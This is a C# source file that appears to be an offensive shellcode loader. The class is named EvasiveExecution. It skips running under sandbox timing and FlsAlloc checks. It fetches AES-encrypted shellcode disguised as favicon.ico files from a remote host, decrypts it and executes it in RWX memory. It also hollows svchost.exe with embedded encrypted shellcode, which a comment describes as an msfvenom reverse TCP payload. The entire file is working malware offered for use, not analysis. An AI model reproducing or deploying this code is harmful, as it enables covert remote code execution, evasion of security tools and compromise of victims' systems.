using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static Execution.Extensions.WinNative;

namespace Execution.Func
{
    public class EvasiveExecution
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Unlock(byte[] locked, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform unlocker = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] unlocked;

                using (MemoryStream msDecrypt = new MemoryStream(locked))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, unlocker, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            unlocked = msPlain.ToArray();
                        }
                    }
                }

                return unlocked;
            }
        }

        public static void Prepare(string host)
        {
            byte[] key = new byte[] {
0xc8,0xe2,0x8e,0x0d,0xfd,0x2b,0xdd,0xa5,0x74,0x2a,0x72,0xc9,
0xac,0x26,0x5b,0xe4,0x30,0x86,0x63,0xc2,0xfa,0xd5,0x3d,0x93,
0x8f,0x6a,0xba,0xc4,0xd6,0xdb,0x45,0x03 };
            byte[] iv = new byte[] {
0xf7,0x44,0xb7,0x62,0x18,0x47,0xbc,0xd6,0xd7,0xa5,0x67,0x77,
0xe5,0xd6,0x2e,0x33 };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            string remoteResource = $"http://{host}/favicon.ico";
            string fileContent = DownloadFile(remoteResource);
            Console.WriteLine($"starting download {remoteResource}");
            //var bytes_filecont = Encoding.UTF8.GetBytes(fileContent);
            byte[] fBt = ConvertHexStringToByteArray(fileContent);
            byte[] unlocked = Unlock(fBt, key, iv);

            TraditionalExec(unlocked);
        }

        public static void MetShc(string host)
        {
            byte[] key = new byte[] {
0x4d,0x67,0x64,0x48,0x72,0x14,0x7e,0xb8,0x57,0x62,0x4e,0xad,
0x24,0xe3,0xe6,0x78,0x95,0x2b,0x19,0xa1,0xae,0x76,0x2d,0xab,
0x4b,0xce,0xf9,0xdd,0x1d,0x9d,0xeb,0x42 };
            byte[] iv = new byte[] {
0x90,0x7c,0x95,0x1e,0x8a,0x64,0xb3,0x01,0x55,0x16,0xf7,0xeb,
0x17,0x6a,0xaf,0xbd };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            string remoteResource = $"http://{host}/metfavicon.ico";
            string fileContent = DownloadFile(remoteResource);
            Console.WriteLine($"starting download {remoteResource}");
            //var bytes_filecont = Encoding.UTF8.GetBytes(fileContent);
            byte[] fBt = ConvertHexStringToByteArray(fileContent);
            byte[] unlocked = Unlock(fBt, key, iv);

            TraditionalExec(unlocked);
        }

        public static void TraditionalExec(byte[] unlocked)
        {
            Console.WriteLine("Entering TraditionalExec");
            int size = unlocked.Length;
            uint sizeUint = (uint)size;

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, sizeUint, 0x3000, 0x40, 0);
            Marshal.Copy(unlocked, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static void ProcessHollowingExec()
        {
            Console.WriteLine("entering proc hollow");
            // process hollow must be executed with small shellcode
            // use msfvenom simple reverse tcp and then proceed with more complex stuff
            byte[] encrypted = new byte[] {
0x29,0x0b,0xe7,0xdc,0xda,0xa8,0x09,0xf5,0xda,0xe2,0x3d,0x0c,
0x83,0xae,0xe7,0xb2,0x91,0x6f,0x1b,0xe3,0x0e,0x53,0x0b,0x50,
0xaf,0x8e,0xec,0x77,0xff,0x5d,0x49,0xa8,0x08,0xff,0xf8,0x3c,
0xc5,0xd0,0xd7,0x21,0x3e,0x8e,0x6f,0x2a,0x9c,0x4b,0x7c,0x1a,
0x5e,0x2b,0x7c,0xd1,0x2b,0xc7,0xfd,0x2c,0x51,0x3e,0xe7,0xcb,
0x1d,0x8a,0xa4,0xa9,0x6b,0x7c,0x16,0xea,0x7d,0xb9,0x70,0xaa,
0xd8,0xff,0x83,0x68,0x01,0x2d,0x89,0xc4,0x04,0xf7,0xa1,0x8f,
0x5e,0xea,0x0b,0xcd,0x88,0xaa,0x2c,0xf9,0xa7,0x51,0xb2,0xbe,
0xd4,0x60,0x8f,0x64,0x46,0xca,0xde,0x04,0x47,0x2d,0xc8,0x48,
0xe9,0x05,0x58,0x77,0x2c,0x1d,0xc3,0xee,0x5b,0x37,0x6b,0xa2,
0x33,0x0c,0x4b,0x50,0xca,0x8e,0x7a,0x39,0x70,0xe6,0xd5,0xd8,
0x57,0x3c,0x33,0x09,0x81,0x2e,0x5d,0x61,0x77,0x5a,0x15,0x1c,
0x72,0x08,0x08,0x0c,0xcf,0xc6,0x54,0x68,0xa8,0x17,0x4d,0xdc,
0x87,0x41,0x2c,0xc4,0x2b,0x01,0x54,0x44,0xed,0x37,0x08,0xd4,
0xe7,0x4a,0xad,0x3e,0xe6,0xc7,0xaa,0x4c,0xa3,0xe0,0xc2,0x35,
0x12,0x09,0xf8,0x82,0x23,0x4f,0xb3,0x0e,0x3b,0x11,0xc4,0x1a,
0x40,0x98,0x11,0x60,0x2f,0x63,0x8d,0xc6,0xcf,0xbb,0x54,0x43,
0x3c,0x46,0x7b,0x77,0x32,0xb1,0x77,0x86,0x73,0x0c,0x94,0x3a,
0xe9,0x36,0x43,0xa9,0x94,0x04,0xf1,0xc1,0x87,0x13,0x46,0x32,
0x75,0x05,0xb0,0x7a,0xa5,0x6b,0x82,0x0f,0x16,0xd8,0x95,0x2e,
0xac,0x9d,0x7e,0x9f,0x5d,0x9e,0x3b,0x0c,0x80,0xb1,0xd1,0x4c,
0xbc,0x17,0x3a,0x9e,0xcd,0x74,0xc8,0x82,0x4b,0x45,0xc3,0x79,
0x21,0x5e,0x4d,0x2e,0xbd,0x03,0x45,0xfd,0x45,0xcc,0xd3,0x33,
0x51,0xa1,0xa8,0x4f,0x64,0x53,0x20,0x37,0xfe,0x77,0x9d,0x7e,
0xb7,0x5d,0x4a,0x4e,0x97,0x89,0xa9,0x1b,0x35,0x69,0xb3,0x47,
0x64,0x62,0x65,0x37,0x3c,0x4f,0xe5,0x82,0x0b,0xe0,0x82,0x13,
0xda,0xee,0x3c,0x23,0x8a,0xed,0x32,0x8c,0x6e,0x9e,0xaa,0x82,
0xa1,0xe6,0x12,0x10,0x1d,0x06,0xcb,0x9c,0x32,0xdf,0xf6,0xb5,
0x1b,0xfc,0xbc,0xa4,0x09,0x57,0x3a,0x29,0x7e,0x51,0xd9,0x58,
0xe9,0xfd,0x99,0x85,0x2c,0xe6,0x91,0x51,0x41,0x4f,0x66,0x59,
0x17,0x6d,0xac,0xb0,0xd9,0x89,0x13,0x5d,0x76,0xf8,0xbc,0xb8,
0x2b,0x05,0xfb,0xea,0x7e,0x7d,0x3a,0xa5,0xda,0xff,0xe8,0x7c,
0x05,0xa1,0xea,0x0e,0xa3,0x2f,0x51,0x72,0x10,0xe1,0x93,0x12,
0x9f,0x69,0x9e,0xea,0xa4,0x49,0xb4,0xd4,0x35,0x83,0xc9,0xa1,
0x21,0x18,0x7b,0x43,0xcb,0x07,0x84,0x92,0xf3,0x55,0x76,0x5b,
0x1e,0xdd,0x1c,0x42,0x4b,0xe0,0x68,0x40,0x69,0xb4,0xda,0xdf,
0x19,0x14,0x6a,0x69,0xb1,0xaa,0xeb,0x9f,0x58,0xa6,0x39,0x42,
0x8b,0xa2,0xb0,0xbe,0xb5,0x51,0x5b,0xea,0x6f,0x07,0x87,0x70,
0xac,0xa1,0x4e,0x7d,0x15,0xcb,0xc1,0xc8 };
            byte[] key = new byte[] {
0x2d,0x3b,0x5f,0x8f,0xb7,0x55,0x16,0xdf,0xe8,0xe9,0x90,0xa9,
0xd9,0xff,0x10,0xee,0x94,0xfb,0xf2,0x56,0x3f,0xa5,0x97,0xe5,
0xfb,0xd1,0xa3,0x00,0x78,0xef,0xf8,0x35 };
            byte[] iv = new byte[] {
0xc5,0xa8,0x58,0xa1,0x8a,0x0f,0x05,0xf4,0x05,0xac,0xb0,0x6c,
0x5b,0x49,0xae,0x14 };

            byte[] unlocked = Unlock(encrypted, key, iv);

            STARTUPINFO processStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION svchostProcessInformation = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION svchostBasicInformation = new PROCESS_BASIC_INFORMATION();
            IntPtr hProcess = IntPtr.Zero;
            uint tmp = 0;
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            bool res =  CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref processStartupInfo, out svchostProcessInformation);
            hProcess = svchostProcessInformation.hProcess;

            ZwQueryInformationProcess(hProcess, 0, ref svchostBasicInformation, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)svchostBasicInformation.PebAddress + 0x10);

            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] peData = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, peData, peData.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(peData, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(peData, (int)opthdr);

            // save svchost process entrypoint address pointer
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // overwrite the content of the entrypoint address with our shellcode
            WriteProcessMemory(hProcess, addressOfEntryPoint, unlocked, unlocked.Length, out nRead);

            // Resume svchost process main thread
            ResumeThread(svchostProcessInformation.hThread);
        }

        static string DownloadFile(string url)
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadString(url);
            }
        }

        static byte[] ConvertHexStringToByteArray(string hexString)
        {
            // Remove quebras de linha, espaços em branco e outros caracteres indesejados
            hexString = Regex.Replace(hexString, @"\s+|\n|\r", "");

            // Separa os elementos pela vírgula
            string[] hexValues = hexString.Split(',');

            // Inicializa o array de bytes
            byte[] bytes = new byte[hexValues.Length];

            // Converte cada valor hexadecimal para byte
            for (int i = 0; i < hexValues.Length; i++)
            {
                if (hexValues[i].StartsWith("0x"))
                {
                    hexValues[i] = hexValues[i].Substring(2); // Remove o prefixo "0x"
                }
                bytes[i] = Convert.ToByte(hexValues[i], 16);
            }

            return bytes;
        }
    }
}